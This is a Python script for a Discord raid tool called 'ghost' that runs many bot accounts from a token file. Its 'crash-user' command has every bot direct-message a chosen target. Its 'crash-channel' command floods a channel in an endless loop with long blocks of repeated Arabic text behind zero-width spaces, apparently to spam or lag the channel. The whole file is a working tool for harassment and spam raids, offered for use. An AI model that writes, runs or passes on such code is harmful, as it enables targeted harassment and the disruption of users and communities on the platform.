import discord
import asyncio
import os
import datetime
from pystyle import Colors, Colorate, Center

def load_tokens():
    with open("tokens.txt", "r") as file:
        return [line.strip() for line in file if line.strip()]

TOKENS = load_tokens()

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True

clients = [discord.Client(intents=intents) for _ in TOKENS]

def timestamp():
    full_microseconds = datetime.datetime.now().strftime('%H:%M:%S.%f')
    return full_microseconds[:-2]

os.system('title ghost')

def draw_menu(full=True):
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = r"""
                     ▄▄▌ ▐ ▄▌      ▄▄▄▄· ▪                       
                     ██· █▌▐█▪     ▐█ ▀█▪██                      
                     ██▪▐█▐▐▌ ▄█▀▄ ▐█▀▀█▄▐█·                     
                     ▐█▌██▐█▌▐█▌.▐▌██▄▪▐█▐█▌                     
                      ▀▀▀▀ ▀▪ ▀█▄▀▪·▀▀▀▀ ▀▀▀                     
          ═════════════════════════════════════════════          
═════════════════════════════════════════════════════════════════
                             @17xet                              
"""
    print(Colorate.Horizontal(Colors.rainbow, Center.XCenter(logo)))
    
    if not full:
        return
    
    print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Threads > 5000")
    print(f"{Colors.red}[{timestamp()}] {Colors.reset}• RateLimit Control > True")
    print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Delay > 0s\n")
    print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Loaded with {len(TOKENS)} bot client(s)")
    print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Loaded command > 'crash-user'")
    print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Loaded command > 'crash-channel'\n")
    print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Command > ", end='')

async def command_loop():
    await asyncio.sleep(5)  
    while True:
        draw_menu()
        command = await asyncio.to_thread(input)

        if command == "crash-user":
            draw_menu(full=False)
            print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Target ID > ", end='')
            user_id = await asyncio.to_thread(input)
            print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Message To Send > ", end='')
            message = await asyncio.to_thread(input)

            start_time = asyncio.get_event_loop().time()

            for client in clients:
                try:
                    user = await client.fetch_user(int(user_id))
                    await user.send(message)
                    print(f"{Colors.green}[{timestamp()}] • Client {client.user.name} successfully sent message to {user.name}")
                except Exception as e:
                    print(f"{Colors.red}[{timestamp()}] Error from {client.user.name}: {e}")

            end_time = asyncio.get_event_loop().time()
            duration = end_time - start_time
            print(f"{Colors.cyan}[{timestamp()}] • Task done in {duration:.15f}s.{Colors.reset}")

            await asyncio.sleep(2.5)

        elif command == "crash-channel":
            draw_menu(full=False)
            print(f"{Colors.red}[{timestamp()}] {Colors.reset}• Channel ID > ", end='')
            channel_id = await asyncio.to_thread(input)

            if not channel_id.isdigit():
                print(f"{Colors.red}[{timestamp()}] Invalid channel ID input. Must be numbers only.")
                await asyncio.sleep(2)
                continue

            channel_id = int(channel_id)

            print(f"{Colors.yellow}[{timestamp()}] {Colors.reset}Note > To stop spamming, press Ctrl + C!")

            long_message = ("الأهدافالتاريخالمادةلجزائلمجتمعالع" * 100) 

            chunks = [long_message[i:i+1999] for i in range(0, len(long_message), 1999)]

            start_time = asyncio.get_event_loop().time()

            try:
                while True:  
                    for client in clients:
                        channel = client.get_channel(channel_id)
                        if channel is None:
                            print(f"{Colors.red}[{timestamp()}] Channel not found by {client.user.name}.")
                            continue

                        for chunk in chunks:
                            
                            await channel.send("\u200b" + chunk)
                            await asyncio.sleep(0.3)  

            except KeyboardInterrupt:
                print(f"\n{Colors.cyan}[{timestamp()}] • Stopped sending messages.{Colors.reset}")

            end_time = asyncio.get_event_loop().time()
            duration = end_time - start_time
            print(f"{Colors.cyan}[{timestamp()}] • Task done in {duration:.15f}s.{Colors.reset}")

            await asyncio.sleep(2.5)

async def start_bot(client, token):
    @client.event
    async def on_ready():
        print(f"{Colors.green}[{timestamp()}] {client.user} is ready.")

    await client.start(token)

async def main():
    bot_tasks = [start_bot(client, token) for client, token in zip(clients, TOKENS)]
    bot_tasks.append(command_loop())
    await asyncio.gather(*bot_tasks)

if __name__ == '__main__':
    asyncio.run(main())
